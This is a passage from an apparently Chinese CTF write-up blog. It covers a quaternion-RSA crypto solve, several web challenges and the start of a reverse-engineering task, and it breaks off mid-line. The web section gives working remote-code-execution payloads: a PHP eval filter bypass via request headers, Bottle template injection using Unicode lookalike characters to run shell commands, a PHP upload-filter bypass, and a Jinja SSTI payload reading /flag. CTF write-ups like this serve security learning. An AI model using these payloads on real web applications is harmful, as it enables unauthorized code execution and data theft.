class="line">        exp //= <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">X = (<span class="number">7380380986429696832</span>, <span class="number">34163292457091182</span>, <span class="number">3636630423226195928</span>, <span class="number">3896730209645707435</span>)</span><br><span class="line">Y = (<span class="number">1015918725738180802</span>, <span class="number">4456058114364993854</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">d = inverse(e, p**<span class="number">4</span> - <span class="number">1</span>)</span><br><span class="line">K = qpow(Y, d, p)</span><br><span class="line"><span class="keyword">assert</span> Y == qpow(K, e, p)</span><br><span class="line">K_inv = qinv(K, p)</span><br><span class="line">F = qmul(K_inv, qmul(X, K, p), p)</span><br><span class="line"><span class="built_in">print</span>(F)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> F:</span><br><span class="line">    flag += long_to_bytes(k)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;flag&#123;0k@y_U_C@n_F1n1sh_iT!!!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="ezbypass"><a href="#ezbypass" class="headerlink" title="ezbypass"></a>ezbypass</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\|implode|phpinfo|localeconv|pos|current|print|var|dump|getallheaders|get|defined|str|split|spl|autoload|extensions|eval|phpversion|floor|sqrt|tan|cosh|sinh|ceil|chr|dir|getcwd|getallheaders|end|next|prev|reset|each|pos|current|array|reverse|pop|rand|flip|flip|rand|content|session_id|session_start|echo|readfile|highlight|show|source|file|assert/i&quot;</span>, <span class="variable">$test</span>))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$test</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;oh nonono hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure></blockquote><p>命令执行考点，过滤很多符号和关键字，发现system和include未被禁，再利用从HTTP头读入内容的内置函数（getallheaders() 或 apache_request_headers()）可获取自由输入值，get被禁，只能用后者。</p><p>apache_request_headers() 返回值是 Array，搜索 Array相关的内置函数，且不含 “array_” 开头 &amp; 不在正则中的，找到 join() 函数，可连接所有值。</p><p>bp抓包，测试时使用 include 回显：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?test=include(join(apache_request_headers()));</span><br></pre></td></tr></table></figure><p><img src="/2025/08/16/match-%E7%AC%AC%E4%B8%80%E5%B1%8ANetDreamCTF/image-20250816200223435.png" alt="image-20250816200223435"></p><p>会讲HTTP头里所有值连接带出，在bp中删除大部分带特殊字符的字符串，增加自定义键值对作为自定义命令，include 换为 system，加上|管道符，即可成功rce：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?test=system(join(apache_request_headers()));</span><br></pre></td></tr></table></figure><p><img src="/2025/08/16/match-%E7%AC%AC%E4%B8%80%E5%B1%8ANetDreamCTF/image-20250816200359281.png" alt="image-20250816200359281"></p><p>​    </p><h3 id="Pickle♥dill"><a href="#Pickle♥dill" class="headerlink" title="Pickle♥dill"></a>Pickle♥dill</h3><blockquote><p>Just the Two of Us</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Have fun!</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> mimetypes</span><br><span class="line"><span class="keyword">import</span> dill</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> Bottle, run, request, template, response</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line">app = Bottle()</span><br><span class="line">UPLOAD_DIR = os.path.abspath(<span class="string">&#x27;./uploads&#x27;</span>)</span><br><span class="line">os.makedirs(UPLOAD_DIR, exist_ok=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">chal</span>():</span><br><span class="line">    <span class="comment"># flag here</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">INDEX_TEMPLATE = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;文件管理&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;style&gt;</span></span><br><span class="line"><span class="string">        body &#123; font-family: Arial, sans-serif; margin: 40px; &#125;</span></span><br><span class="line"><span class="string">        .container &#123; max-width: 800px; margin: 0 auto; &#125;</span></span><br><span class="line"><span class="string">        form &#123; margin-bottom: 20px; padding: 20px; border: 1px solid #ddd; border-radius: 5px; &#125;</span></span><br><span class="line"><span class="string">        input[type=&quot;file&quot;], input[type=&quot;text&quot;] &#123; margin: 10px 0; &#125;</span></span><br><span class="line"><span class="string">        .message &#123; color: green; margin: 10px 0; &#125;</span></span><br><span class="line"><span class="string">        .error &#123; color: red; &#125;</span></span><br><span class="line"><span class="string">    &lt;/style&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;文件上传&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;submit&quot; value=&quot;上传&quot; /&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &lt;h1&gt;文件读取&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;form action=&quot;/read&quot; method=&quot;get&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;text&quot; name=&quot;filename&quot; placeholder=&quot;输入文件名&quot; required /&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;submit&quot; value=&quot;读取&quot; /&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        % if message:</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;message&quot;&gt;&#123;&#123;message&#125;&#125;&lt;/div&gt;</span></span><br><span class="line"><span class="string">        % end</span></span><br><span class="line"><span class="string">        % if error:</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;error&quot;&gt;&#123;&#123;error&#125;&#125;&lt;/div&gt;</span></span><br><span class="line"><span class="string">        % end</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_template</span>(<span class="params">message=<span class="string">&#x27;&#x27;</span>, error=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">return</span> template(INDEX_TEMPLATE, message=message, error=error)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&#x27;/upload&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    upload = request.files.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> upload:</span><br><span class="line">        <span class="keyword">return</span> render_template(error=<span class="string">&#x27;请选择要上传的文件&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> upload.filename:</span><br><span class="line">        <span class="keyword">return</span> render_template(error=<span class="string">&#x27;不要透我！&gt;_&lt;&#x27;</span>)</span><br><span class="line">    filename = os.path.basename(upload.filename)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> filename:</span><br><span class="line">        <span class="keyword">return</span> render_template(error=<span class="string">&#x27;无效的文件名&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    save_path = os.path.join(UPLOAD_DIR, filename)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        upload.save(save_path, overwrite=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> render_template(error=<span class="string">f&#x27;上传失败: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> render_template(message=<span class="string">f&#x27;文件 <span class="subst">&#123;filename&#125;</span> 上传成功！&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>():</span><br><span class="line">    filename = request.query.get(<span class="string">&#x27;filename&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> filename:</span><br><span class="line">        <span class="keyword">return</span> render_template(error=<span class="string">&#x27;请输入文件名&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        <span class="keyword">return</span> render_template(error=<span class="string">&#x27;不要透我！&gt;_&lt;&#x27;</span>)</span><br><span class="line">    safe_name = os.path.basename(filename)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> safe_name:</span><br><span class="line">        <span class="keyword">return</span> render_template(error=<span class="string">&#x27;无效的文件名&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    file_path = os.path.join(UPLOAD_DIR, safe_name)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(file_path):</span><br><span class="line">        <span class="keyword">return</span> render_template(error=<span class="string">&#x27;文件不存在&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(file_path):</span><br><span class="line">        <span class="keyword">return</span> render_template(error=<span class="string">&#x27;请求的不是有效文件&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    mime_type, _ = mimetypes.guess_type(file_path)</span><br><span class="line">    response.content_type = mime_type <span class="keyword">or</span> <span class="string">&#x27;application/octet-stream&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            content = f.read().decode(errors=<span class="string">&#x27;replace&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            challenge = b64encode(dill.dumps(chal())).decode()</span><br><span class="line">            blacklist = <span class="built_in">dir</span>(__builtins__)</span><br><span class="line">            blacklist += <span class="built_in">dir</span>([])</span><br><span class="line">            blacklist += <span class="built_in">dir</span>(<span class="number">1</span>)</span><br><span class="line">            blacklist += <span class="built_in">dir</span>(())</span><br><span class="line">            blacklist += <span class="built_in">dir</span>(<span class="literal">True</span>)</span><br><span class="line">            blacklist += <span class="built_in">dir</span>(<span class="string">&#x27;NO HACKER&#x27;</span>)</span><br><span class="line">            <span class="comment"># I&#x27;m pretty sure nothing can be done now ;) </span></span><br><span class="line">            <span class="comment"># Even if i do not ban dicts, but, u know, is it too complex to SSTI with &#123;&#125; and without almost every magic methods?</span></span><br><span class="line">            <span class="comment"># Here is a hint if you really get stuck:</span></span><br><span class="line">            <span class="comment"># dHJ5IHRvIGV4cGxvaXQgd2l0aCBzb21ldGhpbmcgdW5pcXVlIHRvIGJvdHRsZSA+Xzw=</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> blacklist:</span><br><span class="line">                <span class="keyword">if</span> i <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;STOP HACKING!&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> template(<span class="string">f&#x27;&#x27;&#x27;% import pickle</span></span><br><span class="line"><span class="string">                            % setdefault(&#x27;chal&#x27;, &#x27;<span class="subst">&#123;challenge&#125;</span>&#x27;)</span></span><br><span class="line"><span class="string">The content is: &#x27;&#x27;&#x27;</span> + content) <span class="comment"># Yeah I don’t know why but rendering it is so f**king fun! XD</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">import</span> traceback</span><br><span class="line">            traceback.print_exc()</span><br><span class="line">            <span class="keyword">return</span> content</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> render_template(error=<span class="string">f&#x27;文件读取失败: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    run(app, host=<span class="string">&#x27;localhost&#x27;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>, reloader=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></blockquote><p>bottle容器，/upload 路由上传文件，/read 路由读文件，且文件内容将作为template加载。过滤了很多内置对象，template里用setdefault设置了一个键值对，键名为chal，尝试设置上传文件的内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;chal&#125;&#125;</span><br></pre></td></tr></table></figure><p>由于：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">challenge = b64encode(dill.dumps(chal())).decode()</span><br></pre></td></tr></table></figure><p>/read 读出的是定义的chal类对象的序列化结果，即使用 dill.loads() 反序列化操作，得到的也是对应操作的字节码。</p><p>转变思路，尝试RCE，搜索bottle框架存在的特性，参考：</p><p><a href="https://www.cnblogs.com/LAMENTXU/articles/18805019">聊聊bottle框架中由斜体字引发的模板注入（SSTI）waf bypass</a></p><p>在bottle的SSTI里，他们可以被直接替换成<code>ª</code> (U+00AA)，<code>º</code> (U+00BA)进而绕过各种waf。</p><p>尝试构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;__impºrt__(&quot;os&quot;).pºpen(&quot;cat app.py|base64&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>上传后，访问：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/read?filename=1.txt</span><br></pre></td></tr></table></figure><p>得到的内容base64解码得到源码，即可看到flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> mimetypes</span><br><span class="line"><span class="keyword">import</span> dill</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> Bottle, run, request, template, response</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line">app = Bottle()</span><br><span class="line">UPLOAD_DIR = os.path.abspath(<span class="string">&#x27;./uploads&#x27;</span>)</span><br><span class="line">os.makedirs(UPLOAD_DIR, exist_ok=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># flag&#123;B0ttl3_❤_pickle_and_watch_this_https://www.bilibili.com/video/BV1GJ411x7h7&#125;</span></span><br><span class="line"><span class="comment"># HOW COULD YOU GET THE SOURCE CODE???? PLZ CONTECT QQ:1372449351 PLZPLZPLZ</span></span><br><span class="line"><span class="comment"># YOU ARE TRUELY A SSTI MASTER</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h3><blockquote><p>title</p></blockquote><p>一个文件上传点，上传一个jpg图片，使用bp抓包。</p><p>尝试修改文件后缀为php会替换为空，双写或三写php同样会替换为空；使用 .htaccess 的方法，.htaccess 文件会被重命名；文件内容也会被检测，无法以 <code>&lt;?</code> 开头。</p><p>多次尝试偶然发现四写php居然就成功了…</p><p>使用 <code>&lt;script language=&quot;PHP&quot;&gt;...&lt;/script&gt;</code> 写入PHP语句。</p><p><img src="/2025/08/16/match-%E7%AC%AC%E4%B8%80%E5%B1%8ANetDreamCTF/image-20250816195258396.png" alt="image-20250816195258396"></p><p>最后访问 /uploads/1.php 得到flag。</p><p>​    </p><h3 id="ezpython"><a href="#ezpython" class="headerlink" title="ezpython"></a>ezpython</h3><blockquote><p>Hint：</p><p>fuzz部分需要爆破<a href="http://x.x.x.x/的路径，六位数">http://x.x.x.x/的路径，六位数</a></p></blockquote><p>访问页面，F12源码提示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- ：/s3c0nd --&gt;</span><br></pre></td></tr></table></figure><p>访问 /s3c0nd 后提示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">only fuzz(number)</span><br></pre></td></tr></table></figure><p>根据hint，bp爆破或直接尝试出路由 /114514，访问，F12源码提示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 听说访问该页面的某get参数的某个数值可以爆源码 --&gt;</span><br></pre></td></tr></table></figure><p>bp爆破或直接尝试参数为name，SSTI RCE即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/114514?name=&#123;&#123;cycler.__init__.__globals__.os.popen(%27cat%20/flag%27).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/08/16/match-%E7%AC%AC%E4%B8%80%E5%B1%8ANetDreamCTF/image-20250816194926634.png" alt="image-20250816194926634"></p><p>​    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="NMTZ-LIKE-RE"><a href="#NMTZ-LIKE-RE" class="headerlink" title="NMTZ_LIKE_RE"></a>NMTZ_LIKE_RE</h3><p>IDA打开，main函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *v3; <span class="comment">// rax</span></span><br><span class="line">  FILE *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> Buffer[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-58h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+30h] [rbp-50h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+38h] [rbp-48h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+40h] [rbp-40h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+48h] [rbp-38h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+50h] [rbp-30h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+58h] [rbp-28h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+60h] [rbp-20h]</span></span><br><span class="line">  __int64 v15; <span class="comment">// [rsp+68h] [rbp-18h]</span></span><br><span class="line">  __int64 v16; <span class="comment">// [rsp+70h] [rbp-10h]</span></span><br><span class="line">  __int64 v17; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line">  __int64 v18; <span class="comment">// [rsp+80h] [rbp+0h]</span></span><br><span class="line">  __int64 v19; <span class="comment">// [rsp+88h] [rbp+8h]</span></span><br><span class="line">  __int64 v20; <span class="comment">// [rsp+90h] [rbp+10h]</span></span><br><span class="line">  __int64 v21; <span class="comment">// [rsp+98h] [rbp+18h]</span></span><br><span class="line">  <span class="type">char</span> Str1[<span class="number">8</span>]; <span class="comment">// [rsp+A0h] [rbp+20h] BYREF</span></span><br><span class="line">  __int64 v23; <span class="comment">// [rsp+A8h] [rbp+28h]</span></span><br><span class="line">  __int64 v24; <span class="comment">// [rsp+B0h] [rbp+30h]</span></span><br><span class="line">  <span class="type">char</span> v25[<span class="number">10</span>]; <span class="comment">// [rsp+B8h] [rbp+38h] BYREF</span></span><br><span class="line">  __int64 v26; <span class="comment">// [rsp+C2h] [rbp+42h]</span></span><br><span class="line">  __int64 v27[<span class="number">3</span>]; <span class="comment">// [rsp+D0h] [rbp+50h]</span></span><br><span class="line">  <span class="type">char</span> v28[<span class="number">9</span>]; <span class="comment">// [rsp+E8h] [rbp+68h]</span></span><br><span class="line">  __int64 v29; <span class="comment">// [rsp+F1h] [rbp+71h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v30; <span class="comment">// [rsp+103h] [rbp+83h]</span></span><br><span class="line">  <span class="type">int</span> v31; <span class="comment">// [rsp+104h] [rbp+84h]</span></span><br><span class="line">  <span class="type">int</span> v32; <span class="comment">// [rsp+108h] [rbp+88h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10Ch] [rbp+8Ch]</span></span><br><span class="line"></span><br><span class="line">  _main(argc, argv, envp);</span><br><span class="line">  anti_debug();</span><br><span class="line">  v27[<span class="number">0</span>] = <span class="number">0x5A78B74098E0D0F8</span>i64;</span><br><span class="line">  v27[<span class="number">1</span>] = <span class="number">0xB8072877E8726FD8</span>ui64;</span><br><span class="line">  v27[<span class="number">2</span>] = <span class="number">0x7FF08872E08A47E8</span>i64;</span><br><span class="line">  v28[<span class="number">0</span>] = <span class="number">-56</span>;</span><br><span class="line">  *&amp;v28[<span class="number">1</span>] = <span class="number">0x908A088A57AFE862</span>ui64;</span><br><span class="line">  v29 = <span class="number">0x50787AA78FDFE080</span>i64;</span><br><span class="line">  *Str1 = <span class="number">0</span>i64;</span><br><span class="line">  v23 = <span class="number">0</span>i64;</span><br><span class="line">  v24 = <span class="number">0</span>i64;</span><br><span class="line">  <span class="built_in">memset</span>(v25, <span class="number">0</span>, <span class="keyword">sizeof</span>(v25));</span><br><span class="line">  v26 = <span class="number">0</span>i64;</span><br><span class="line">  v32 = <span class="number">41</span>;</span><br><span class="line">  v31 = <span class="number">90</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v32; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v30 = *(v27 + i);</span><br><span class="line">    v30 -= <span class="number">23</span>;</span><br><span class="line">    v30 = 